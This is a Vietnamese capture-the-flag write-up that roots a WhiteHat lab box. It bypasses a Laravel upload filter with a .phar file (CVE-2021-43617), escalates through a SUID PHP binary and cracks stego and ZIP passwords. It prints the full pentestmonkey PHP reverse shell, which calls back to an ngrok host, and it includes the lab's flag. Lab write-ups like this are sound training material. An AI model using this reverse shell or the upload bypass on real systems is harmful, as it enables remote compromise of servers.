---
title: [Write-Up] WhiteHat Boot2root
subtitle: A boot2root box from WhiteHat
cover-img: 
thumbnail-img:
tags: [Linux, Lavarel, PHP, SUID, Steganography]
readtime: true
---
# Phase 1: Reconnaissance (Khai thác thông tin)

Đầu tiên tất nhiên ta sẽ đi scan xem box đang chạy những dịch vụ nào. Vì có firewall nên mình dùng `-Pn -vv`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cbc09c02-6605-4fc4-be59-a8ad67ca9a82/Untitled.png)

```bash
┌──(janlele91㉿j4nl3le)-[~/Desktop/HackTheBox/Boot2root]
└─$ nmap -Pn -vv 49.236.211.69 -o nmap.txt
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 22:59 +07
Initiating Parallel DNS resolution of 1 host. at 22:59
Completed Parallel DNS resolution of 1 host. at 22:59, 2.54s elapsed
Initiating Connect Scan at 22:59
Scanning 49.236.211.69 [1000 ports]
Discovered open port 22/tcp on 49.236.211.69
Discovered open port 8000/tcp on 49.236.211.69
Completed Connect Scan at 22:59, 15.95s elapsed (1000 total ports)
Nmap scan report for 49.236.211.69
Host is up, received user-set (0.025s latency).
Scanned at 2022-07-20 22:59:26 +07 for 16s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
8000/tcp open  http-alt syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.62 seconds
```

Kết quả cho thấy có 2 port là 22 (SSH) và 8000 (HTTP). Có vẻ như SSH chắc không được đâu nên mình thử với port 8000 trước. Truy cập vào trang thì đây là trang mặc định của Lavarel, có version 8.73.2 với PHP7.4.30. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3bec4f83-8750-411d-88d2-9ae2cb820524/Untitled.png)

Việc tiếp theo là tìm các directory hay file ẩn thui. Mình dùng dirsearch với cú pháp đơn giản như dưới.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/141ef1c5-67c1-4a38-a88a-259a7b2a48c5/Untitled.png)

Kết quả xuất hiện 2 file robots.txt và web.config, tuy nhiên không có thông tin gì để khai thác. Truy cập vào đường dẫn `/upload` 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e3d21294-a23d-4156-ba09-184820d63994/Untitled.png)

Đây có lẽ là trang cho chúng ta upload file lên. Tuy nhiên trang web hiện `Nothing here` , nghe mùi bị lừa. Inspect trang ra thì thấy có ẩn một form upload.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ed46cd1f-fb6a-4816-97ac-1a805fb690c6/Untitled.png)

Tắt thuộc tính `visibility: hidden` đi và ta có nơi để upload file.

# Phase 2: Foothold

Ta sẽ upload thử file `test.txt` có nội dung trên xem.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e9b06040-572d-47b0-8ff3-39f7b0302418/Untitled.png)

Upload thành công và nó lưu ở đường dẫn `/images/1658333200.txt`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b8214379-3f9e-43e1-b477-47f28df042a1/Untitled.png)

Xem file thành công.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/45b860cd-99ed-4beb-aeae-b429076fee83/Untitled.png)

Thử với php thì saoo?

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/31740313-4b00-4bb7-a31c-f8e4c9a0413f/Untitled.png)

Lỗi trả về cho biết trang web chỉ cho upload những định dạng ảnh.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bacf92fa-9be8-4903-a5aa-dbff57f8896f/Untitled.png)

Mình upload thử ảnh bình thường thì xem được, tuy nhiên khi upload đến ảnh có kích thước lớn thì trang web trả lỗi.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3c27afed-dd89-49e3-98f4-61e356d5611a/Untitled.png)

Có vẻ như web không tắt chế độ Debug, và cho chúng ta biết được lỗi nằm ở dòng code nào. Có một file `UploadController.php` có nội dung như sau:

```php
public function imageUploadPost(Request $request)
	
{

// $request->validate([

// 'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg,php|max:2048',

// ]);

$validate = new Validate;

$notallowextension = ['html','js'];

if(!$validate->tester($request->image,['sfdfsdfdsfs'])){

 

    if(in_array($request->image->getClientOriginalExtension(), $notallowextension)){

        return back()->with('fail','Upload fail, require image with extension jpeg,png,jpg,gif,svg.');

    }

}

else {return back()->with('fail','Upload fail, require image with extension jpeg,png,jpg,gif,svg.');}

$imageName = time().'.'.$request->image->getClientOriginalExtension();

$request->image->move(public_path('images'), $imageName);

/* Store $imageName name in DATABASE from HERE */

return back()

->with('success','You have successfully upload image.')

->with('image',$imageName)

;

}
```

Đây chính là đoạn xử lý file ta upload. Nó chỉ cấm các file như HTML, JS và mặc định Lavarel ở version 8.73.2 cũng cấm luôn upload các file php với các extension khác nhau bằng hàm `shouldBlockPhpUpload`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/959d08d4-c2a4-45ba-bda5-c956f2f14e4e/Untitled.png)

Bên cạnh đó, mình có thấy các trường hợp mà web trả lỗi, trong đó có trường hợp không upload file.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/23e01d9a-5d27-4081-872a-fa2e90ea13fb/Untitled.png)

Mình thử click vào button Upload luôn mà không thêm file vào, xuất hiện lỗi sau đây và chính đoạn code của hàm `shouldBlockPhpUpload`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ab90ed4b-08ca-47e9-a576-c787c3c73678/Untitled.png)

Tuy nhiên điều đặc biệt ở đây là nó không cấm file có đuôi `.phar` (Bạn có thể đọc file phar là gì ở [đây](https://www.php.net/manual/en/phar.fileformat.phar.php).). Có vẻ như box cố tình xóa đoạn này vì hình trên cho thấy Lavarel 8.73.2 đã fix lỗi này. Để biết thêm lỗi gì thì đó là CVE-2021-43617 (Link: [(1) Phân tích và hướng dẫn triển khai CVE-2021-43617 (Phần 1) | WhiteHat.vn](https://whitehat.vn/threads/phan-tich-va-huong-dan-trien-khai-cve-2021-43617-phan-1.16286/)). Cụ thể, với các web được host bởi các server sử dụng nhân Debian như Ubuntu thì khi upload file `.phar` lên nó vẫn thực thi được code PHP. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ca2a8c04-30d6-45cc-be78-d5e445c3c8c8/Untitled.png)

Trong khi đó box cũng chạy trên Ubuntu → Ta sẽ upload file .phar có chứa code PHP để reverse shell về máy mình.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5a3c3a54-c869-4b9a-9acc-75ab3f8a213b/Untitled.png)

Test trước với file `.phar` có code `<?php echo "testttt"; ?>` 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/12a7e412-2d02-40d5-b7fd-4a337f4c45f7/Untitled.png)

Thành cônggg~. Mục tiêu bây giờ là public một port máy local của mình để lắng nghe kết nối reverse shell về máy. Mình sẽ sử dụng ngrok để public port 4567 ra ngoài.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4a072d79-5445-4755-b36b-1260db869c96/Untitled.png)

Khi đó ta cần payload php kết nối về domain [0.tcp.ap.ngrok.io](http://0.tcp.ap.ngrok.io) ở port 11177. Sử dụng payload sau có nguồn từ [php-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell (github.com)](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Ta chỉnh IP và Port tương ứng. Đồng thời lưu thành file .phar để upload.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '0.tcp.ap.ngrok.io';
$port = 11177;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Upload thành công và truy cập đến đường dẫn của file. Tất nhiên máy local sẽ lắng nghe ở port 4567 trước.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7faae360-4470-4bf2-8234-157a483c87cb/Untitled.png)

Và ta đã có shell. Giờ thì leo thang thôi.

# Phase 3: Privilege Escalation

Sau một hồi mày mò, thì mình tìm được manh mối khi thử liệt kê các file có SUID. Cụ thể, có một file `/usr/bin/php7.4` đáng khả nghi vì thường php được cài đặt sẽ có đường dẫn là `/usr/bin/php`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/91643151-957b-4bda-8900-6578754ac833/Untitled.png)

Mình chạy thử với câu lệnh như hình trên, và có vẻ như cách hoạt động của nó y chang php bình thường. Mình check ra thì biết nó cũng là của `root`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/65bca4d5-d756-4725-8f4a-e9446b7c45fa/Untitled.png)

Khi đó mình chỉ cần thực hiện lệnh sau, dựa vào document của GTFOBins. Cụ thể, từ file binary `/usr/bin/php7.4` này ta thực thi lệnh `/bin/bash -p` vì option `-p` cho ta thực thi file dưới quyền owner, ở đây chính là `root`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d6b35497-66be-41c3-a3e3-f0f265d0a793/Untitled.png)

Thực thi và ta đã leo thang thành công và chiếm được quyền root. Kiếm được file `root.txt`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/592fabe8-10d7-4f6e-9e3f-123d74e689f9/Untitled.png)

Tuy nhiên đây là file ảnh JPEG dựa vào header chunk `JFIF`. Bây giờ ta cần xem ảnh, ở đây mình dùng cách đưa nó lên đường dẫn `/images` của web và set full quyền để có thể truy cập bằng 2 câu lệnh sau

```php
cp root/root.txt /var/www/html/43617/public/images/
chmod 777 /var/www/html/43617/public/images/root.txt
```

Truy cập web ở port 8000 với đường dẫn `/images/root.txt`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bb59dbab-888f-43ff-a4b6-7d76ae5985d1/Untitled.png)

Download ảnh về bằng wget và tất nhiên xóa nó đi để tránh phá box 😀

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/225a5986-3e99-442e-a178-1c99c2584ab8/Untitled.png)

Đổi thành đuôi jpeg và mở ảnh lên và chưa có flag :< 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea643ef7-ce38-4f76-a238-332d3846489c/Untitled.png)

Đến đây mình có lẽ cần dùng đến các kĩ thuật trong Steganography. Mình dùng `stegcracker` là một tool bruteforce password để xem file ẩn bên trong. Ở đây mình dùng wordlist `rockyou.txt` và có được kết quả.

```bash
┌──(janlele91㉿j4nl3le)-[~/Desktop/HackTheBox/Boot2root]
└─$ stegcracker root.jpeg rockyou.txt 
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2022 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'root.jpeg' with wordlist 'rockyou.txt'..
Successfully cracked file with password: freedom
Tried 896 passwords
Your file has been written to: root.jpeg.out
freedom
```

Mật khẩu là `freedom` và tool cũng tự output cho mình thư mục chứa file ẩn trong đó luôn. Truy cập thì phát hiện có file `flag.txt`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c8ea97d5-d607-45e2-96af-c48065eb09c9/Untitled.png)

Tuy nhiên đây là file ZIP và có password. Mình nghĩ ngày đến crack password file zip bằng `john the ripper`***.***

```bash
──(janlele91㉿j4nl3le)-[~/…/HackTheBox/Boot2root/root (1).jpeg/data]
└─$ zip2john flag.txt > flag_hash.txt
ver 1.0 efh 5455 efh 7875 flag.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=54, decmplen=42, crc=8C1844AE ts=5921 cs=5921 type=0
                                                                                                                                                                
┌──(janlele91㉿j4nl3le)-[~/…/HackTheBox/Boot2root/root (1).jpeg/data]
└─$ cat flag_hash.txt                   
flag.zip/root.txt:$pkzip$1*2*2*0*36*2a*8c1844ae*0*42*0*36*5921*c53967f82039cd33b2148b8b23af3dfcc23bd6c63a0a0e0d155a56be9d750c3fd4a84b868030f9d3de899ff6c6e18e317fba8f6a7b68*$/pkzip$:root.txt:flag.zip::flag.zip

┌──(janlele91㉿j4nl3le)-[~/…/HackTheBox/Boot2root/root (1).jpeg/data]
└─$ john --wordlist=../../rockyou.txt flag_hash.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
friend           (flag.txt/root.txt)     
1g 0:00:00:00 DONE (2022-07-20 22:43) 20.00g/s 163840p/s 163840c/s 163840C/s 123456..total90
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/edc5e809-5f5d-4de7-b2f1-931c21779625/Untitled.png)

Thử với wordlist `rockyou.txt` và ta đã có password là `friend`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/963932ac-1e92-4d91-8196-e1369bf62dbe/Untitled.png)

Giải nén file `flag.txt` ra và ta có file `root.txt` cần tìm với flag.


> 💡 FLAG: **Lab2{*c0ngr4tul4t0n_y0u_4r3_1s_th3_b3st*}**


Owned by *Janlele91* 😍😍